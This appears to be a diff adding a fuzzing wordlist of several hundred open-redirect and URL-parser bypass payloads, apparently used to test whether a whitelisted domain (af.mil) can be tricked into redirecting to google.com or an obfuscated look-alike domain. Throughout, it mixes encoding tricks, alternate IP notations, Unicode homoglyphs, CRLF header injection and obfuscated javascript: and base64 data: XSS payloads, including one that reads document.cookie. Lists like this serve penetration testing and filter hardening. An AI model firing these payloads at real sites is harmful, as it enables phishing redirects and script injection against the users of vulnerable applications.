@@ -1,0 +1,532 @@
+https:google.com
+https;google.com
+https:\/\/google.com
+https:/\/\google.com
+https:\\google.com
+https://google.com
+https://google.com\@af.mil
+https://googee.com/@af.mil
+http://af.mil.google.com
+http://google.com/af.mil
+https://af.mil.google.com/af.mil
+https://af.mil@google.com/af.mil
+https://af.mil%2f@google.com
+https:/af.mil%252f@google.com
+https://af.mil%25252f@google.com
+https://google.com/@af.mil
+https://google.com%ff.example.com
+https://google.com╱.af.mil
+https://google.com%E2%95%B1.af.mil                
+<>//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///\;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/〱Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ 
+.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+\/\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+〱Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ 
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹ %00｡Ｐ 
+%01https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+%01https://google.com
+////%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%09/google.com
+///%09/google.com
+//%09/google.com
+/%09/google.com
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+////%09/af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%09/af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%09/af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%09/af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%09/af.mil@google.com
+///%09/af.mil@google.com
+//%09/af.mil@google.com
+/%09/af.mil@google.com
+&%0d%0a1Location:https://google.com
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+%19Jav%09asc%09ript:https%20://af.mil/%250Aconfirm%25281%2529
+////216.58.214.206
+///216.58.214.206
+//216.58.214.206
+/\216.58.214.206
+/216.58.214.206
+216.58.214.206
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+%2f216.58.214.206//
+%2f216.58.214.206
+%2f216.58.214.206%2f%2f
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//%2f%2fⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%2f%2fⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+%2f$2f216.58.214.206
+$2f%2f216.58.214.206%2f%2f
+%2f$2f3627734734
+$2f%2f3627734734%2f%2f
+//%2f%2fgoogle.com
+/%2f%2fgoogle.com
+$2f%2fgoogle.com
+%2f$2fgoogle.com
+$2f%2fgoogle.com%2f%2f
+%2f3627734734//
+%2f3627734734
+%2f3627734734%2f%2f
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/
+%2fgoogle.com//
+%2fgoogle.com
+%2fgoogle.com%2f%2f
+////3627734734
+///3627734734
+//3627734734
+/\3627734734
+/3627734734
+3627734734
+//3H6k7lIAiqjfNeN@af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@af.mil+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@af.mil@google.com/
+//3H6k7lIAiqjfNeN@af.mil+@google.com/
+////%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%5cgoogle.com
+///%5cgoogle.com
+//%5cgoogle.com
+/%5cgoogle.com
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+////%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%5caf.mil@google.com
+///%5caf.mil@google.com
+//%5caf.mil@google.com
+/%5caf.mil@google.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@af.mil/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@af.mil/
+";alert(0);//
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+data:af.mil;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹ %E3%80%82pw
+//google%00.com
+/\google%252ecom
+google%252ecom
+<>//google.com
+/<>//google.com
+//;@google.com
+///;@google.com
+/////google.com/
+/////google.com
+////\;@google.com
+////google.com//
+////google.com/
+////google.com
+///\;@google.com
+///google.com//
+///google.com/
+///google.com
+//\/google.com/
+//\google.com
+//google.com//
+//google.com/
+//google.com
+/.google.com
+/\/\/google.com/
+/\/google.com/
+/\/google.com
+/\google.com
+/〱google.com
+/google.com
+../google.com
+.google.com
+@google.com
+\/\/google.com/
+〱google.com
+google.com
+google.com%23@af.mil
+////google.com/%2e%2e
+///google.com/%2e%2e
+//google.com/%2e%2e
+/google.com/%2e%2e
+//google.com/%2E%2E
+////google.com/%2e%2e%2f
+///google.com/%2e%2e%2f
+//google.com/%2e%2e%2f
+////google.com/%2f..
+///google.com/%2f..
+//google.com/%2f..
+//google.com/%2F.. 
+/google.com/%2F.. 
+////google.com/%2f%2e%2e
+///google.com/%2f%2e%2e
+//google.com/%2f%2e%2e
+/google.com/%2f%2e%2e
+//google.com//%2F%2E%2E
+//google.com:80?@af.mil/
+//google.com:80#@af.mil/
+google.com/.jpg
+//google.com\taf.mil/
+//google.com/af.mil
+//google.com\@af.mil
+google.com/af.mil
+//google%E3%80%82com
+/http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/http:/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://00330.00072.0000326.00000316
+http:00330.00072.0000326.00000316
+http://00330.0x3a.54990
+http:00330.0x3a.54990
+http://00330.3856078
+http:00330.3856078
+http://0330.072.0326.0316
+http:0330.072.0326.0316
+http:%0a%0dⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:%0a%0dgoogle.com
+http://0xd8.072.54990
+http:0xd8.072.54990
+http://0xd8.0x3a.0xd6.0xce
+http:0xd8.0x3a.0xd6.0xce
+http://0xd8.3856078
+http:0xd8.3856078
+http://0xd83ad6ce
+http:0xd83ad6ce
+http://[::216.58.214.206]
+http:[::216.58.214.206]
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.af.mil/
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.af.mil/
+http://3627734734
+http:3627734734
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.af.mil/
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://3H6k7lIAiqjfNeN@af.mil+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://3H6k7lIAiqjfNeN@af.mil@google.com/
+http://3H6k7lIAiqjfNeN@af.mil+@google.com/
+http://472.314.470.462
+http:472.314.470.462
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.af.mil/
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@af.mil/
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@af.mil/
+http://[::ffff:216.58.214.206]
+http:[::ffff:216.58.214.206]
+/http://google.com
+/http:/google.com
+http://;@google.com
+http://.google.com
+http://google.com
+http:/\/\google.com
+http:/google.com
+http:google.com
+http://google.com%23.af.mil/
+http://google.com%2f%2f.af.mil/
+http://google.com%3F.af.mil/
+http://google.com%5c%5c.af.mil/
+http://google.com:80?@af.mil/
+http://google.com:80#@af.mil/
+http://google.com\taf.mil/
+//https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https:Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://%09/google.com
+https://%09/google.com
+https://%09/af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%09/af.mil@google.com
+https://%0a%0dⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%0a%0dgoogle.com
+//https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+/https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https%3a%2f%2fgoogle.com%2f
+/https://%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https:/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https:/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/https://%5cgoogle.com
+/https:/%5cgoogle.com/
+https://%5cgoogle.com
+https:/%5cgoogle.com/
+/https://%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%5caf.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://%5caf.mil@google.com
+https://%5caf.mil@google.com
+https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
+//https://google.com//
+/https://google.com//
+/https://google.com/
+/https://google.com
+/https:google.com
+https://////google.com
+https://google.com//
+https://google.com/
+https://google.com
+https:/\google.com
+https:google.com
+//https:///google.com/%2e%2e
+/https://google.com/%2e%2e
+https:///google.com/%2e%2e
+//https://google.com/%2e%2e%2f
+https://google.com/%2e%2e%2f
+/https://google.com/%2f..
+https://google.com/%2f..
+/https:///google.com/%2f%2e%2e
+/https://google.com/%2f%2e%2e
+https:///google.com/%2f%2e%2e
+https://google.com/%2f%2e%2e
+https://:@google.com\@af.mil
+https://google.com?af.mil
+https://google.com/af.mil
+https://google.com\af.mil
+https://google.com#af.mil
+https://google%E3%80%82com
+//https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+/https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://:@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@af.mil
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/af.mil
+https://af.mil;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+https:///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+/https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+/https:///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https:///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https://af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//https://af.mil@google.com//
+/https://af.mil@google.com/
+https://af.mil;@google.com
+https://af.mil.google.com
+https://af.mil@google.com//
+https://af.mil@google.com/
+https://af.mil@google.com
+/https://af.mil@google.com/%2e%2e
+https:///af.mil@google.com/%2e%2e
+//https://af.mil@google.com/%2e%2e%2f
+https://af.mil@google.com/%2e%2e%2f
+/https://af.mil@google.com/%2f..
+https://af.mil@google.com/%2f..
+/https:///af.mil@google.com/%2f%2e%2e
+/https://af.mil@google.com/%2f%2e%2e
+https:///af.mil@google.com/%2f%2e%2e
+https://af.mil@google.com/%2f%2e%2e
+/https://af.mil@google.com/%2f.//af.mil@google.com/%2f..
+https://af.mil/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://af.mil/https://google.com/
+@https://www.google.com
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\taf.mil/
+http://af.mil@00330.00072.0000326.00000316
+http:af.mil@00330.00072.0000326.00000316
+http://af.mil@00330.0x3a.54990
+http:af.mil@00330.0x3a.54990
+http://af.mil@00330.3856078
+http:af.mil@00330.3856078
+http://af.mil@0330.072.0326.0316
+http:af.mil@0330.072.0326.0316
+http://af.mil@0xd8.072.54990
+http:af.mil@0xd8.072.54990
+http://af.mil@0xd8.0x3a.0xd6.0xce
+http:af.mil@0xd8.0x3a.0xd6.0xce
+http://af.mil@0xd8.3856078
+http:af.mil@0xd8.3856078
+http://af.mil@0xd83ad6ce
+http:af.mil@0xd83ad6ce
+http://af.mil@[::216.58.214.206]
+http:af.mil@[::216.58.214.206]
+http://af.mil%2eⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://af.mil%2egoogle.com/
+http://af.mil@3627734734
+http:af.mil@3627734734
+http://af.mil@472.314.470.462
+http:af.mil@472.314.470.462
+http://af.mil:80%40Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://af.mil:80%40google.com/
+http://af.mil@[::ffff:216.58.214.206]
+http:af.mil@[::ffff:216.58.214.206]
+http://af.mil@google.com/
+http://af.mil+&@google.com#+@af.mil/
+http://af.mil+&@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@af.mil/
+http://www.google.com\.af.mil
+http://www.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.af.mil
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http://XY>.7d8T\205pZM@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http://XY>.7d8T\205pZM@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://XY>.7d8T\205pZM@af.mil+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://XY>.7d8T\205pZM@af.mil@google.com/
+http://XY>.7d8T\205pZM@af.mil+@google.com/
+ja\nva\tscript\r:alert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+java%0dscript:alert(1)
+Javas%26%2399;ript:alert(1)
+javascript://%0aalert(1)
+<>javascript:alert(1);
+//javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1);
+/javascript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1);
+javascript:alert(1)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://af.mil/?z=%0Aalert(1)
+javascript:prompt(1)
+jaVAscript://af.mil//%0d%0aalert(1);//
+javascript://af.mil?%a0alert%281%29
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\taf.mil/
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/af.mil
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@af.mil
+//af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+//af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/af.mil
+af.mil;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+//af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+////af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+///af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/\af.mil:80%40google.com
